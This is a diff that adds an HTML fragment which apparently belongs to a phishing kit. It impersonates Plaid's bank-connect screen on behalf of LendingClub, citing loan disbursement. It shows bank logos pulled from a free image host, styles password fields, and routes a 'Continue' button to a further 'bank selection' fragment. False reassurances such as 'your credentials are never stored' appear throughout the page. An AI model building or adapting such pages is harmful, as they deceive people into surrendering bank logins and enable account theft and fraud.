@@ -1,0 +1,401 @@
+<style>
+/* ═══════════════════════════════════════════════
+   PLAID DESIGN SYSTEM — shared across all fragments
+   ═══════════════════════════════════════════════ */
+:root {
+  --p-black:   #111111;
+  --p-navy:    #113b5e;
+  --p-blue:    #1a56ff;
+  --p-gray1:   #f5f5f5;
+  --p-gray2:   #e8e8e8;
+  --p-gray3:   #b0b0b0;
+  --p-gray4:   #6b6b6b;
+  --p-white:   #ffffff;
+  --p-green:   #0fa55a;
+  --p-red:     #e0341b;
+  --p-radius:  10px;
+  --p-shadow:  0 4px 24px rgba(0,0,0,0.10);
+  --p-trans:   all 0.22s cubic-bezier(.4,0,.2,1);
+}
+
+* { margin:0; padding:0; box-sizing:border-box; }
+
+.p-wrap {
+  min-height: 100vh;
+  display: flex;
+  justify-content: center;
+  align-items: flex-start;
+  padding: 16px 12px 32px;
+  background: #f0f2f5;
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+  -webkit-font-smoothing: antialiased;
+}
+
+.p-card {
+  background: var(--p-white);
+  border-radius: 16px;
+  box-shadow: var(--p-shadow);
+  width: 100%;
+  max-width: 440px;
+  padding: 0;
+  overflow: hidden;
+}
+
+/* ── Top bar with Plaid logo ── */
+.p-topbar {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 16px 20px 0;
+}
+.p-plaid-logo {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+}
+.p-plaid-logo img {
+  height: 22px;
+  width: auto;
+}
+.p-plaid-wordmark {
+  font-size: 17px;
+  font-weight: 700;
+  letter-spacing: -0.5px;
+  color: var(--p-black);
+}
+.p-lock-icon {
+  width: 30px;
+  height: 30px;
+  background: var(--p-gray1);
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  color: var(--p-gray4);
+  font-size: 13px;
+}
+
+/* ── Progress dots ── */
+.p-progress {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 6px;
+  padding: 14px 20px 0;
+}
+.p-dot {
+  width: 7px;
+  height: 7px;
+  border-radius: 50%;
+  background: var(--p-gray2);
+  transition: var(--p-trans);
+}
+.p-dot.active  { background: var(--p-black); transform: scale(1.2); }
+.p-dot.done    { background: var(--p-green); }
+.p-progress-bar-wrap {
+  padding: 14px 20px 0;
+}
+.p-progress-bar {
+  width: 100%;
+  height: 3px;
+  background: var(--p-gray2);
+  border-radius: 2px;
+  overflow: hidden;
+}
+.p-progress-bar-fill {
+  height: 100%;
+  background: var(--p-black);
+  border-radius: 2px;
+  transition: width 0.5s cubic-bezier(.4,0,.2,1);
+}
+
+/* ── Institution header ── */
+.p-inst-header {
+  display: flex;
+  align-items: center;
+  gap: 14px;
+  padding: 18px 20px 0;
+}
+.p-inst-logo {
+  width: 48px;
+  height: 48px;
+  border-radius: 12px;
+  background: var(--p-gray1);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  overflow: hidden;
+  flex-shrink: 0;
+  border: 1px solid var(--p-gray2);
+}
+.p-inst-logo img  { max-width: 78%; max-height: 78%; object-fit: contain; }
+.p-inst-logo svg  { width: 100%; height: 100%; }
+.p-inst-info h3   { font-size: 15px; font-weight: 600; color: var(--p-black); line-height: 1.2; }
+.p-inst-info span { font-size: 12.5px; color: var(--p-gray4); margin-top: 2px; display: block; }
+
+/* ── Body content ── */
+.p-body {
+  padding: 20px 20px 24px;
+}
+.p-title {
+  font-size: 20px;
+  font-weight: 700;
+  color: var(--p-black);
+  letter-spacing: -0.3px;
+  margin-bottom: 6px;
+}
+.p-sub {
+  font-size: 13.5px;
+  color: var(--p-gray4);
+  line-height: 1.55;
+  margin-bottom: 20px;
+}
+
+/* ── Input group ── */
+.p-field {
+  margin-bottom: 14px;
+}
+.p-label {
+  display: block;
+  font-size: 12px;
+  font-weight: 600;
+  color: var(--p-gray4);
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  margin-bottom: 6px;
+}
+.p-input {
+  width: 100%;
+  padding: 13px 14px;
+  border: 1.5px solid var(--p-gray2);
+  border-radius: var(--p-radius);
+  font-size: 15px;
+  color: var(--p-black);
+  background: var(--p-white);
+  transition: var(--p-trans);
+  outline: none;
+  box-sizing: border-box;
+}
+.p-input:focus    { border-color: var(--p-black); box-shadow: 0 0 0 3px rgba(17,17,17,0.08); }
+.p-input.p-error  { border-color: var(--p-red); }
+.p-input-wrap     { position: relative; }
+.p-input-wrap .p-input { padding-right: 44px; }
+.p-eye {
+  position: absolute;
+  right: 13px;
+  top: 50%;
+  transform: translateY(-50%);
+  background: none;
+  border: none;
+  cursor: pointer;
+  color: var(--p-gray3);
+  font-size: 15px;
+  padding: 4px;
+}
+.p-eye:hover { color: var(--p-black); }
+
+/* ── Error message ── */
+.p-error-msg {
+  font-size: 12px;
+  color: var(--p-red);
+  margin-top: 5px;
+  display: none;
+}
+.p-error-msg.show { display: block; }
+
+/* ── Buttons ── */
+.p-btn {
+  width: 100%;
+  padding: 14px;
+  background: var(--p-black);
+  color: var(--p-white);
+  border: none;
+  border-radius: var(--p-radius);
+  font-size: 15px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: var(--p-trans);
+  letter-spacing: 0.1px;
+  margin-top: 4px;
+}
+.p-btn:hover    { background: #222; transform: translateY(-1px); box-shadow: 0 4px 14px rgba(0,0,0,0.18); }
+.p-btn:active   { transform: translateY(0); }
+.p-btn:disabled { background: var(--p-gray2); color: var(--p-gray3); cursor: not-allowed; transform: none; box-shadow: none; }
+.p-btn-ghost {
+  width: 100%;
+  padding: 13px;
+  background: transparent;
+  color: var(--p-black);
+  border: 1.5px solid var(--p-gray2);
+  border-radius: var(--p-radius);
+  font-size: 14px;
+  font-weight: 500;
+  cursor: pointer;
+  transition: var(--p-trans);
+  margin-top: 10px;
+}
+.p-btn-ghost:hover { background: var(--p-gray1); border-color: var(--p-gray3); }
+
+/* ── Divider ── */
+.p-divider {
+  height: 1px;
+  background: var(--p-gray2);
+  margin: 18px 0;
+}
+
+/* ── Footer ── */
+.p-footer {
+  padding: 0 20px 20px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 5px;
+  font-size: 12px;
+  color: var(--p-gray4);
+}
+.p-footer i { font-size: 11px; color: var(--p-green); }
+
+/* ── Loading spinner ── */
+.p-spinner {
+  display: inline-block;
+  width: 20px; height: 20px;
+  border: 2px solid rgba(255,255,255,0.3);
+  border-top-color: #fff;
+  border-radius: 50%;
+  animation: pSpin 0.7s linear infinite;
+  vertical-align: middle;
+  margin-right: 8px;
+}
+@keyframes pSpin { to { transform: rotate(360deg); } }
+
+/* ── Generic bank SVG ── */
+.p-gen-bank svg { width: 100%; height: 100%; }
+
+
+.p-feature {
+  display: flex;
+  align-items: flex-start;
+  gap: 12px;
+  padding: 13px 0;
+  border-bottom: 1px solid var(--p-gray2);
+}
+.p-feature:last-of-type { border-bottom: none; }
+.p-feature-icon {
+  width: 36px; height: 36px;
+  border-radius: 10px;
+  background: var(--p-gray1);
+  display: flex; align-items: center; justify-content: center;
+  flex-shrink: 0;
+  font-size: 16px;
+  color: var(--p-black);
+}
+.p-feature-text strong { display: block; font-size: 13.5px; font-weight: 600; color: var(--p-black); margin-bottom: 2px; }
+.p-feature-text span   { font-size: 12.5px; color: var(--p-gray4); line-height: 1.5; }
+
+.p-privacy {
+  font-size: 12px;
+  color: var(--p-gray4);
+  line-height: 1.6;
+  text-align: center;
+  padding: 16px 0 4px;
+}
+.p-privacy a { color: var(--p-black); text-decoration: underline; cursor: pointer; }
+
+.p-bank-row {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 10px;
+  padding: 16px 0 0;
+}
+.p-bank-pill {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  background: var(--p-gray1);
+  border: 1px solid var(--p-gray2);
+  border-radius: 20px;
+  padding: 5px 11px 5px 7px;
+  font-size: 12px;
+  font-weight: 500;
+  color: var(--p-black);
+}
+.p-bank-pill img {
+  width: 20px; height: 20px;
+  border-radius: 50%;
+  object-fit: contain;
+  background: #fff;
+}
+.p-banks-label {
+  font-size: 11.5px;
+  color: var(--p-gray3);
+  text-align: center;
+  margin-top: 8px;
+}
+</style>
+
+<div class="p-wrap">
+  <div class="p-card">
+
+    <!-- Top bar -->
+    <div class="p-topbar">
+      <div class="p-plaid-logo">
+        <img src="https://i.ibb.co/20tK8xrs/pngwing-com.png" alt="Plaid">
+        <span class="p-plaid-wordmark">plaid</span>
+      </div>
+      <div class="p-lock-icon"><i class="fas fa-lock"></i></div>
+    </div>
+
+    <div class="p-body">
+      <div style="margin-bottom:20px;">
+        <p class="p-title">Connect your bank account</p>
+        <p class="p-sub">LendingClub uses Plaid to securely link your bank account for loan disbursement.</p>
+      </div>
+
+      <!-- Feature list -->
+      <div class="p-feature">
+        <div class="p-feature-icon"><i class="fas fa-shield-alt"></i></div>
+        <div class="p-feature-text">
+          <strong>Bank-level security</strong>
+          <span>256-bit AES encryption. Your credentials are never stored on our servers.</span>
+        </div>
+      </div>
+      <div class="p-feature">
+        <div class="p-feature-icon"><i class="fas fa-bolt"></i></div>
+        <div class="p-feature-text">
+          <strong>Instant verification</strong>
+          <span>Connect and verify account ownership in seconds with read-only access.</span>
+        </div>
+      </div>
+      <div class="p-feature">
+        <div class="p-feature-icon"><i class="fas fa-eye-slash"></i></div>
+        <div class="p-feature-text">
+          <strong>Private &amp; secure</strong>
+          <span>Plaid doesn't sell personal data and uses it only for verification.</span>
+        </div>
+      </div>
+
+      <!-- Supported banks row -->
+      <div class="p-bank-row">
+        <div class="p-bank-pill"><img src="https://i.ibb.co/BH9430KX/chase-blue.png" alt="Chase"> Chase</div>
+        <div class="p-bank-pill"><img src="https://i.ibb.co/y2w6V8G/ids1vsu729-1758079371686.jpg" alt="BofA"> BofA</div>
+        <div class="p-bank-pill"><img src="https://i.ibb.co/pvhd5yHk/us-bank-idavyamfbl-1.png" alt="USBank"> US Bank</div>
+      </div>
+      <p class="p-banks-label">+ 11,000 financial institutions supported</p>
+
+      <p class="p-privacy">
+        By continuing, you agree to Plaid's <a>End User Privacy Policy</a> and authorize LendingClub to access your account data.
+      </p>
+
+      <button class="p-btn" style="margin-top:16px;"
+        onclick="window.SPA && window.SPA.renderFragment('p_banksel_v1','Loading…')">
+        Continue <i class="fas fa-arrow-right" style="margin-left:6px;font-size:12px;"></i>
+      </button>
+    </div>
+
+    <div class="p-footer">
+      <i class="fas fa-lock"></i>
+      <span>Protected by Plaid &amp; 256-bit SSL encryption</span>
+    </div>
+  </div>
+</div>
